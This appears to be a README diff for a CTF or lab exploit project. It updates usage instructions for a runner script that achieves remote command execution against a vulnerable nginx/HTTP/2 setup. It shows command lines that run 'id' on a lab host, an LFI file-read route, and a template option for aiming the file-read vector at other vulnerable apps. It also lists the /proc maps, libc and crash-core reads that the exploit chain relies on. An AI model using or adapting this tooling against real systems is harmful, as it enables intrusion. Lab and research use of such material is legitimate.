@@ -91,8 +91,26 @@ ASLR-enabled VM research chain:
 Recording-friendly terminal demo:
 
 ```bash
-./demo_ctf_exploit_v1_6.py --host 192.168.1.205 --port 19321 --clear --require-reset-core --rounds 2 --exec-cmd id
+./demo_ctf_exploit_v1_8.py --host 192.168.1.205 --port 19321 --cmd id --clear
 ```
+
+`demo_ctf_exploit_v1_8.py` is the current operator-facing runner. By default it uses the best-tested lab path, keeps console output to key stages and evidence, prints detailed target fingerprints, and leaves captured command output as the final terminal block. Pass `-v` for probe/candidate-level trace output.
+
+The default file-read primitive is this fork's PHP route:
+
+```text
+/lfi.php?file=<path>&offset=<n>&length=<n>
+```
+
+For a different known-vulnerable CTF app or testing platform, the file-read vector is modular:
+
+```bash
+./demo_ctf_exploit_v1_8.py --host 192.168.1.205 --cmd id \
+  --target-profile generic \
+  --file-read-template 'http://{host}:{port}/download?path={path_url}{range_query}'
+```
+
+The template supports `{host}`, `{port}`, `{path_url}`, `{offset}`, `{length}`, and `{range_query}`. The generic profile skips this fork's lab-specific nginx config assertions, but the exploit still needs the same underlying capabilities: readable nginx worker `/proc` maps, readable libc, readable crash core, and a compatible vulnerable nginx/HTTP/2 layout.
 
 Additional lab notes and run logs are under `docs/`, especially:
 
